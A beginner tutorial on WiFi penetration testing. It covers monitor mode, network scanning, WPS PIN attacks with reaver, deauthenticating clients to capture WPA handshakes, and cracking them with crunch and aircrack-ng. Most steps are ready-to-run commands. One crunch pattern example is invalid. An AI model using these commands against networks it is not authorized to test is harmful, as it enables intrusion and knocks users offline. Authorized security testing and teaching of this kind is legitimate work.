# WiFi Penetration Testing Guide

> **Disclaimer:** This guide is for educational purposes only. Use these tools exclusively on networks you own or have explicit permission to test. Unauthorized use may be illegal.

---

## Table of Contents
- [Introduction](#introduction)
- [Prerequisites](#prerequisites)
- [Setting Up Monitor Mode](#setting-up-monitor-mode)
- [Network Scanning](#network-scanning)
- [Performing WPS Attacks](#performing-wps-attacks)
- [Capturing WPA/WPA2 Handshakes](#capturing-wpapawpa2-handshakes)
- [Cracking WPA/WPA2 Passwords](#cracking-wpapawpa2-passwords)

---

## Introduction

Greetings! This guide will show you one of the simplest methods for testing WiFi network security. It is designed with beginners in mind, providing step-by-step instructions and practical examples. Happy hacking—but always use your skills responsibly!

---

## Prerequisites

Before you begin, ensure you have:
- **Operating System:** A Linux distribution (Kali Linux is highly recommended for beginners).
- **Wireless Adapter:** An adapter that supports monitor mode and packet injection (e.g., Alfa AWUS036NHA).
- **Required Tools:** Tools such as the `aircrack-ng` suite, `wash`, `reaver`, and `crunch` should be installed (these are usually preinstalled on Kali Linux).
- **Basic Command Line Skills:** Familiarity with using the Linux terminal will help you follow along.

---

## Setting Up Monitor Mode

Monitor mode allows your wireless adapter to capture all traffic within range.

### 1. List Available Interfaces
```bash
iwconfig
```
This command displays all available wireless devices.  
**Example Output:**
```
wlan0     IEEE 802.11  ESSID:"HomeWiFi"  Mode:Managed  Frequency:2.412 GHz  
wlan1     IEEE 802.11  ESSID:off/any  Mode:Monitor  Frequency:2.412 GHz  
```

### 2. Disable the Interface

Replace `wlan1` with your adapter's name.
```bash
ifconfig wlan1 down
```
**Example:** If your adapter is named `wlan0`, run:
```bash
ifconfig wlan0 down
```

### 3. Stop Interfering Processes
```bash
airmon-ng check kill
```
This stops processes that might interfere with monitor mode.

### 4. Enable Monitor Mode
```bash
iwconfig wlan1 mode monitor
```
**Example:** For adapter `wlan0`:
```bash
iwconfig wlan0 mode monitor
```

### 5. Re-enable the Interface
```bash
ifconfig wlan1 up
```

### 6. Verify Monitor Mode
Run `iwconfig` again to confirm that your interface is now in monitor mode (look for `Mode:Monitor` in the output).

---

## Network Scanning

With your adapter in monitor mode, you can now scan for nearby networks.

### Scan 2.4 GHz Networks
```bash
airodump-ng wlan1
```
This command lists all networks in the 2.4 GHz band.

### Scan 5 GHz Networks
```bash
airodump-ng --band a wlan1
```
This command scans only the 5 GHz band.

### Scan Both Bands (2.4 GHz & 5 GHz)
```bash
airodump-ng --band abg wlan1
```
This scans both 2.4 GHz and 5 GHz networks.

### Capture Scan Data
Replace `<target_mac>` with the network's MAC address and `<channel>` with its channel.
```bash
airodump-ng --bssid <target_mac> --channel <channel> --write <file name> wlan1
```
**Example:**  
```bash
airodump-ng --bssid 00:11:22:33:44:55 --channel 2 --write test_capture wlan1
```
This command saves the scan results to a file (e.g., `test_capture-01.cap`) for further analysis.

---

## Performing WPS Attacks

WPS attacks target routers with Wi-Fi Protected Setup enabled. This method is often easier than cracking WPA/WPA2.

### 1. Identify Networks with WPS Enabled
```bash
wash --interface wlan1
```
**Example Output:**
```
BSSID              Channel  WPS  Version  Locked  ESSID
00:11:22:33:44:55  6        Yes  1.0      No      HomeWiFi
```
This command lists nearby networks that support WPS.

### 2. Execute a WPS Attack
Replace `<target_mac>` and `<channel>` with the appropriate values.
```bash
reaver --bssid <target_mac> --channel <channel> --interface wlan1 -vvv --no-associate
```
**Example:**  
```bash
reaver --bssid 00:11:22:33:44:55 --channel 6 --interface wlan1 -vvv --no-associate
```
- **`-vvv`:** Enables detailed output, helping you track the progress.
- **`--no-associate`:** Uses manual association, which can sometimes yield better results.

If all goes well, the command should eventually display the network password. If not, move on to capturing WPA/WPA2 handshakes.

---

## Capturing WPA/WPA2 Handshakes

Capturing the handshake between a router and a connected client is essential for testing WPA/WPA2 security.

### 1. Start Handshake Capture
Replace `<target_mac>` and `<channel>` with your target’s details.
```bash
airodump-ng --bssid <target_mac> --channel <channel> --write <file name> wlan1
```
**Example:**  
```bash
airodump-ng --bssid 00:11:22:33:44:55 --channel 2 --write wpa_handshake wlan1
```
Let this command run until a handshake is captured.

### 2. Accelerate Handshake Capture with Deauthentication
Force a connected client to reconnect by deauthenticating them:
```bash
aireplay-ng --deauth 4 -a <target_mac> -c <client_mac> wlan1
```
**Example:**  
If the target MAC is `00:11:22:33:44:55` and the client's MAC is `66:77:88:99:AA:BB`, run:
```bash
aireplay-ng --deauth 4 -a 00:11:22:33:44:55 -c 66:77:88:99:AA:BB wlan1
```
- **`-a`:** Specifies the target network's MAC address.
- **`-c`:** Specifies the client's MAC address.

---

## Cracking WPA/WPA2 Passwords

Once a handshake is captured, you can attempt to crack the network password using a wordlist.

### 1. Generate a Wordlist Using Crunch
For example, to create a wordlist for passwords of length 6 to 8:
```bash
crunch 6 8 abcdefghijklmnopqrstuvwxyz0123456789 -o wordlist.txt
```
**Another Example with Patterns:**  
```bash
crunch 6 8 abc123 -t @@@@ -o wordlist.txt
```
This generates a file named `wordlist.txt` containing potential passwords.

### 2. Crack the Password with Aircrack-ng
```bash
aircrack-ng wpa_handshake-01.cap -w wordlist.txt
```
- **`wpa_handshake-01.cap`:** The file containing the captured handshake.
- **`wordlist.txt`:** Your generated wordlist.

**Example:**  
If your handshake file is named `wpa_handshake.cap`, the command would be:
```bash
aircrack-ng wpa_handshake.cap -w wordlist.txt
```
Aircrack-ng will try each password from the wordlist against the handshake until a match is found. Note that this process can take some time depending on your wordlist size and the password complexity.

---

**Don't get yourselves arrested lol**
